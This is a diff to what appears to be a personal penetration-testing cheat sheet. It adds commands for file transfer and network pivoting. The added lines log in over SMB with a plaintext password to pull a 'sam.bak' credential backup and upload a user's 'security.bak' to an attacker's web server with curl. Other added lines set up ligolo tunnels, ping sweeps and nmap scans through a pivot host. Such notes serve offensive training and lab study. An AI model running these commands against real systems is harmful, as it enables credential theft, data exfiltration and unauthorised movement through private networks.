@@ -401,11 +401,24 @@ sudo python3 -m pyftpdlib --port 21
 
 (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
 
+# Download a file via impacket-smbclient
+impacket-smbclient 'mlefay':'Plain Human work!'@172.16.5.35
+smbclient:>
+use Users
+cd mlefay/Documents
+get sam.bak
+
+
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+
 # Upload a file via WebServer 
 pip3 install uploadserver
 python3 -m uploadserver
 
 Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+or
+curl.exe -F "files=@C:\Users\mlefay\Documents\security.bak" http://192.168.49.128:8000/upload
+
 
 # Upload a file via smbshare 
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
@@ -1151,7 +1164,7 @@ listener_list (Listing listener have add )
 start
 kill          (Disconnect a specific agent)
 
-# Add a route on the attacker's machine.
+# Add a ligolo route on the attacker's machine.
 sudo ip route add 172.16.5.0/24 dev ligolo    (done)         ( run in hacer shell)
  
 # Setting Reverse Shell in proxy
@@ -1159,6 +1172,22 @@ listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234 --tcp   ( run in proxy)
 
 # setting to Access the Agent's own Localhost.
 sudo ip route add 240.0.0.1/32 dev1 ligolo                   ( run in hacer shell)
+
+# Command need to run  , ping and nmap in pivot 
+for i in {1..254}; do ping -c 1 -W 1 172.16.5.$i | grep "from" & done
+
+nmap -sT -Pn --unprivileged --send-eth 172.16.6.45
+
+# Get infor of ligolo
+ip route show dev ligolo
+
+# Setting new ligolo2 router 
+sudo ip tuntap add user $(whoami)  mode tun ligolo2
+sudo ip link set ligolo2 up
+
+start --tun ligolo2  (proxy)
+
+sudo ip route add 172.16.6.0/24 dev ligolo2
 ```
 ## Active Directory
 
